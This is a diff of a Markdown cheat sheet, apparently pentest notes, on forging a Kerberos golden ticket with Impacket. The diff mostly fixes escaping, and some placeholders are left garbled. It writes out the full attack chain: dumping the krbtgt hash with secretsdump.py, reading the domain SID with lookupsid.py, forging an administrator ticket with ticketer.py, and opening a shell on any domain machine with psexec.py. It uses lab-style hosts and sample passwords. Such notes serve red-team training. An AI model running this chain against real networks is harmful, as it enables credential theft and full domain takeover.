@@ -17,10 +17,10 @@ Impacket contains a number of tools that can be used to obtain the krbtg hash an
 </summary> 
 <br>
   
-    secretsdump.py \<domain\>\/\<user\>\:\<password\> \<dc\-ip\>
+    secretsdump.py <domain>/<user>:<password> <dc-ip>
 <br>
 
-    secretsdump.py home.local\/TaMBSZZkfd\:Password11@10.0.2.250
+    secretsdump.py home.local/TaMBSZZkfd:Password11@10.0.2.250
     
 </details>
 
@@ -31,10 +31,10 @@ Impacket contains a number of tools that can be used to obtain the krbtg hash an
 </summary> 
   <br>
   
-    lookupsid.py \<domain\>\/\<user\>\:\<password\> \<dc\-ip\>
+    lookupsid.py <domain>/<user>:<password> <dc-ip>
 <br>
   
-    lookupsid.py home.local\/TaMBSZZkfd\:\'\?\^kigXF\?oG\,y\{o\=\'@10.0.2.250
+    lookupsid.py home.local/TaMBSZZkfd:'?^kigXF?oG,y{o='@10.0.2.250
 </details>
 
 <br>
@@ -44,10 +44,10 @@ Impacket contains a number of tools that can be used to obtain the krbtg hash an
 </summary>
   <br>
   
-    ticketer.py \-aes \<aes\-256\> \-domain\-sid \<SID\> \-domain \<domain\> \-user\-id \<500\> username
+    ticketer.py -aes <aes-256> -domain-sid <SID> -domain <domain> -user-id <500> username
 <br>
   
-    ticketer.py \-aes 5735dd8eaf424d966ef640d4056e2eb90310345d58b074103444483bdf736861 \-domain\-sid S\-1\-5\-21\-536825828\-3248286720\-2276939788 \-domain home.local \-user\-id 500 administrator
+    ticketer.py -aes 5735dd8eaf424d966ef640d4056e2eb90310345d58b074103444483bdf736861 -domain-sid S-1-5-21-536825828-3248286720-2276939788 -domain home.local -user-id 500 administrator
 </details>
 
 <br>
@@ -57,7 +57,7 @@ Impacket contains a number of tools that can be used to obtain the krbtg hash an
 </summary>
   <br>
   
-    export KRB5CCNAME\=\/home\/kali\/Documents\/administrator.ccache
+    export KRB5CCNAME=/home/kali/Documents/administrator.ccache
 </details>
 
 <br>
@@ -66,9 +66,7 @@ Impacket contains a number of tools that can be used to obtain the krbtg hash an
   Use psexec to obtain a shell on any machine in the domain
 </summary>
   <br>
-  
-    psexec.py \<domain\>\/\<user\>@\<hostname\>.\<fqdn\> \-no\-pass \-k
-<br>
-  
-    psexec.py home.local\/administrator@TargetPC.home.local \-no\-pass \-k
+    psexec.py \&lt;domain\&lt;/\&lt;user\&lt;@\&lt;hostname\&lt;.\&lt;fqdn\&lt; -no-pass -k
+<br>  
+    psexec.py home.local/administrator@TargetPC.home.local -no-pass -k
 </details>
